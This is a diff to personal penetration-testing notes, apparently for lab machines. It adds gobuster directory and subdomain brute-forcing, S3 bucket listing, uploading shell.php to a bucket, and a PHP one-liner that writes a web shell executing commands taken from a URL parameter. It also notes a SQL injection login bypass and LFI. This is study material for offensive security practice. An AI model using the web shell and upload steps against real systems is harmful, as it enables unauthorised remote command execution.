@@ -7,8 +7,15 @@ nmap -sV -sC #returns what service and version is running on most common ports, 
 gobuster - used to scan website directories for interesting pages and directories
 git clone https://github.com/danielmiessler/SecLists.git  #To grab a curated wordlist to scan for
 By default, Wordlists on Kali are located in the /usr/share/wordlists directory
-gobuster dir --url http://IP_Addres/ -x php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+gobuster dir --url http://domain.com/ -x php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://domain.com   #to scan for sub-domains.  vhost is for brute-forcing
 
+S3 Buckets:
+awscli utility
+aws configure  #Configures awscli; set temp to each option
+aws --endpoint=http://sub.domain.com s3 ls  #to list all of the buckets hosted by the S3 server
+aws --endpoint=http://sub.domain.com s3 ls s3://domain.com
+aws --endpoint=http://sub.domain.com s3 cp shell.php s3://domain.com  #To copy files to S3 bucket from our machine
 
 php and sql authentication webpage, depending on the code used, could be susceptible to SQL injection attacks.
 Enter anything for the password, it does not matter.  Anything after the # will be ignored since it is considered a comment.  The username simply needs to match one in the DB.
@@ -25,6 +32,10 @@ Wappalyzer is a browser extension that can show you the make up of a website and
 
 sudo nano /etc/hosts  #to edit hosts file
 echo "10.129.128.223 domain.com" | sudo tee -a /etc/hosts  #to add to hosts file directly
+
+To create a file via the CLI.  In the following case we can use the following PHP one-liner which uses the system() function which takes the URL parameter
+cmd as an input and executes it as a system command.
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
 intended to be an option for this application. A common example is when an application uses the path to a
